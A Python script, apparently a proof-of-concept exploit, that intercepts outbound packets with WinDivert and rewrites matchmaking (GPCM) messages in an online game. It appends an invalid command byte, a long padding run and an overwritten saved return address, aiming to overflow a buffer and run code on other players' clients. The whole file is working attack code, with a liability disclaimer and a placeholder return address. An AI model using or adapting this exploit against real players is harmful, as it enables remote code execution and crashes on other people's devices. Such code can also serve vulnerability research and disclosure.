"""This code will inject arbitrary code into a client's game.

You are fully responsible for all activity that occurs while using this code.
The author of this code can not be held liable to you or to anyone else as a
result of damages caused by the usage of this code.
"""

__author__ = 'MikeIsAStar'
__date__ = '11 Oct 2023'

import re
import sys

try:
    import pydivert
except ModuleNotFoundError:
    sys.exit("The 'pydivert' module is not installed !")


# Variables
LR_SAVE = b'\x41\x41\x41\x41'
assert len(LR_SAVE) == 0x04
PADDING = b'MikeStar'
assert len(PADDING) > 0x00

# Constants
DWC_MATCH_COMMAND_INVALID = b'\xFE'
PADDING_LENGTH = 0x23C
FINAL_KEY = b'\\final\\'
WINDIVERT_FILTER = 'outbound and tcp and tcp.PayloadLength > 0'


def try_modify_payload(payload):
    message_pattern = rb'\\msg\\GPCM([1-9][0-9]?)vMAT'
    message = re.search(message_pattern, payload)
    if not message:
        return None

    payload = payload[:message.end()]
    payload += DWC_MATCH_COMMAND_INVALID
    payload += (PADDING * (PADDING_LENGTH // len(PADDING) + 1))[:PADDING_LENGTH]
    payload += LR_SAVE
    payload += FINAL_KEY
    return payload


def main():
    try:
        with pydivert.WinDivert(WINDIVERT_FILTER) as packet_buffer:
            for packet in packet_buffer:
                payload = try_modify_payload(packet.payload)
                if payload is not None:
                    print('Modified a GPCM message !')
                    packet.payload = payload
                packet_buffer.send(packet)
    except KeyboardInterrupt:
        pass
    except PermissionError:
        sys.exit('This program must be run with administrator privileges !')


if __name__ == '__main__':
    main()
